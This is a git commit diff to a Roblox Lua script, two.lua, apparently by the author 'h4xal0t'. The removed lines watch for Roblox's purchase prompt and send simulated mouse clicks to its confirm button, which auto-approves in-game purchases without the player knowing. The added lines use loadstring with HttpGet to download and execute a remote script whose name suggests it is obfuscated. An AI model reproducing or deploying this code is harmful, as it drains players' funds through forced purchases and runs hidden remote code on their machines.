551e8cd539169dc69c9d60b8497daf426e2f092f
h4xal0t <132388501+h4xal0t@users.noreply.github.com>
2023-11-02 20:20:51 +0800

    Update two.lua

--- two.lua
+++ two.lua
@@ -1,17 +1,2 @@
-_G.owo = true
-spawn(function()
-  while true do
-    if not task.wait(0.5) or not _G.owo then
-      break
-    end
-    if not (game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator:FindFirstChild("Prompt") and game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt:FindFirstChild("AlertContents") and game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents:FindFirstChild("Footer")) or not game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer:FindFirstChild("Buttons") then
-    elseif not game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons:FindFirstChild("2") then
-      game:GetService("VirtualInputManager"):SendMouseButtonEvent(game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons[1].AbsolutePosition.X + tonumber(250), game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons[1].AbsolutePosition.Y + tonumber(50), 0, true, game, 1)
-      task.wait()
-      game:GetService("VirtualInputManager"):SendMouseButtonEvent(game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons[1].AbsolutePosition.X + tonumber(250), game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons[1].AbsolutePosition.Y + tonumber(50), 0, false, game, 1)
-    end
-  end
-  return
-end
-)
-return
+loadstring(game:HttpGet("https://raw.githubusercontent.com/h4xal0t/wtf/main/Protected_9909131513277395.lua.txt"))()
+wait(10000000)
